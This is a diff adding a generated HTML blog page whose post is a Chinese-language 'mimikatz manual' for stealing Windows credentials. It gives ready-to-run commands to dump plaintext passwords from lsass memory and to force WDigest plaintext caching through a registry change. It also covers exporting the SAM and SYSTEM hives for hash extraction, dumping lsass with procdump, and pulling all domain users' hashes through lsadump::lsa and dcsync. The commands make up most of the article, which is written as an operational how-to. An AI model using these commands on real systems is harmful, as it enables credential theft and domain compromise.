@@ -1,0 +1,261 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>mimikatz使用手册 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="参考文章：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-mo-&#x2F;p&#x2F;11890232.html 简介它可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密">
+<meta property="og:type" content="article">
+<meta property="og:title" content="mimikatz使用手册">
+<meta property="og:url" content="http://example.com/2022/02/27/mimikatz%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="参考文章：https:&#x2F;&#x2F;www.cnblogs.com&#x2F;-mo-&#x2F;p&#x2F;11890232.html 简介它可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-02-27T09:22:53.000Z">
+<meta property="article:modified_time" content="2022-02-28T01:05:38.138Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-mimikatz使用手册" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/02/27/mimikatz%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" class="article-date">
+  <time class="dt-published" datetime="2022-02-27T09:22:53.000Z" itemprop="datePublished">2022-02-27</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      mimikatz使用手册
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-mo-/p/11890232.html">https://www.cnblogs.com/-mo-/p/11890232.html</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>它可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码， lsass是微软Windows系统的安全机制它主要用于本地安全和登陆策略，通常我们在登陆系统时输入密码之后，密码便会储存在 lsass内存中，经过其 wdigest 和 tspkg 两个模块调用后，对其使用可逆的算法进行加密并存储在内存之中， 而 mimikatz 正是通过对lsass逆算获取到明文密码；也就是说只要你不重启电脑，就可以通过它获取到登陆密码，只限当前登陆系统。</p>
+<p>注意事项：在安装了KB2871997补丁或者系统版本大于windows server 2012时，系统的内存中就不再保存明文的密码，这样利用mimikatz就不能从内存中读出明文密码了。mimikatz的使用需要administrator用户执行，administrators中的其他用户都不行。</p>
+<h3 id="1-获取本地账号密码"><a href="#1-获取本地账号密码" class="headerlink" title="1.获取本地账号密码"></a>1.获取本地账号密码</h3><h4 id="1-1本地执行"><a href="#1-1本地执行" class="headerlink" title="1.1本地执行"></a>1.1本地执行</h4><p>下载mimikatz，找到自己系统对应的位数，右键以管理员身份运行：</p>
+<p>#提升权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<p>#抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当目标为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，但可以通过修改注册表的方式抓取明文。</p>
+<p>cmd修改注册表命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f </span><br></pre></td></tr></table></figure>
+
+<p>#重启或用户重新登录后可以成功抓取</p>
+<h4 id="1-2SAM表获取hash"><a href="#1-2SAM表获取hash" class="headerlink" title="1.2SAM表获取hash"></a>1.2SAM表获取hash</h4><p>#导出SAM数据 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure>
+
+<p>#将SYSTEM、SAM文件放在同一目录下，使用mimikatz提取hash </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">token::elevate</span><br><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-Procdump-Mimikatz"><a href="#2-Procdump-Mimikatz" class="headerlink" title="2.Procdump+Mimikatz"></a>2.Procdump+Mimikatz</h3><p>当mimikatz无法在主机上运行时，可以使用微软官方发布的工具Procdump导出lsass.exe：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</span><br></pre></td></tr></table></figure>
+
+<p>将lsass.dmp下载到本地后，然后执行mimikatz：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;&quot;sekurlsa::logonPasswords full&quot;exit</span><br></pre></td></tr></table></figure>
+
+<p>为了方便复制与查看，可以输出到本地文件里面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;sekurlsa::minidump lsass.dmp&quot;&quot;sekurlsa::logonPasswords full&quot; &gt; pssword.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="3-读取域控中域成员Hash"><a href="#3-读取域控中域成员Hash" class="headerlink" title="3.读取域控中域成员Hash"></a>3.读取域控中域成员Hash</h3><p>注：得在域控上以域管理员身份执行mimikatz</p>
+<p>方法一：直接执行</p>
+<p>#提升权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">privilege::debug</span><br></pre></td></tr></table></figure>
+
+<p>#抓取密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::lsa /patch</span><br></pre></td></tr></table></figure>
+
+<p>方法二：通过 dcsync，利用目录复制服务（DRS）从NTDS.DIT文件中检索密码哈希值，可以在域管权限下执行获取：</p>
+<p>#获取所有域用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.com /all /csv</span><br></pre></td></tr></table></figure>
+
+<p>#指定获取某个用户的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsadump::dcsync /domain:test.com /user:test</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/02/27/mimikatz%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/" data-id="cl060wkku00011cwf1lte59i8" data-title="mimikatz使用手册" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/02/28/psexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          psexec横向移动
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">February 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/02/28/psexec%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">psexec横向移动</a>
+          </li>
+        
+          <li>
+            <a href="/2022/02/27/mimikatz%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C/">mimikatz使用手册</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
